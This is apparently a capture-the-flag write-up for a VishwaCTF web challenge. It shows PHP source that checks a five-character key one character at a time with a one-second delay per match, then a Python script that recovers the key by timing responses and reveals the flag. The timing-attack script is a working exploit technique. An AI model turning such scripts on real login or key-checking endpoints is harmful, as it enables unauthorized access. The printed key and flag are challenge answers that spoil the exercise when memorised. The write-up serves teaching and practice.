# Solution

The source Code -> 

```php
<?php
include "env.php";
set_time_limit(0);
if(isset($_GET['key'])){
    $your_input = $_GET['key'];
    if(strlen($your_input)!=5){
    die("It's five characters long, and may or may not contain numbers or characters or small letters or capital letters");
    }
    for($i=0; $i<strlen($your_input);$i++)
    {
        $let_check=$_ENV['our_input'];
        if($your_input[$i]!=$let_check[$i]){
            die("VERY VERY VERY INCORRECT");
        }
        usleep(1000000);
    }
    echo getenv('THE_THING_YOU_ARE_LOOKING_FOR');
}
?>
```

So you can see after every iteration it delays by 1 sec.

By this we can guess each keyword seperately by python.

```python
import requests
import time

URL = "https://time-is-an-illusion.vishwactf.com/handle.php?key="

flag = ""

for i in range(1,6):
    max_time = i
    temp = ""
    for j in range(32,127):
        before = time.time()
        response = requests.get(URL + flag + chr(j) + 'a'*(5-i))
        response.close()
        after = time.time()
        if(after-before >= max_time):
            print(chr(j) , end = "\n")
            max_time = after-before
            temp = chr(j)
    print("\n" + temp + "\n")
    flag+=temp
print(flag)
```

So with each keyword we find the max_time increases by 1

So key = KuKa9

``` Flag : vishwaCTF{PhP_h@$_iTs_0wN_PErK$} ```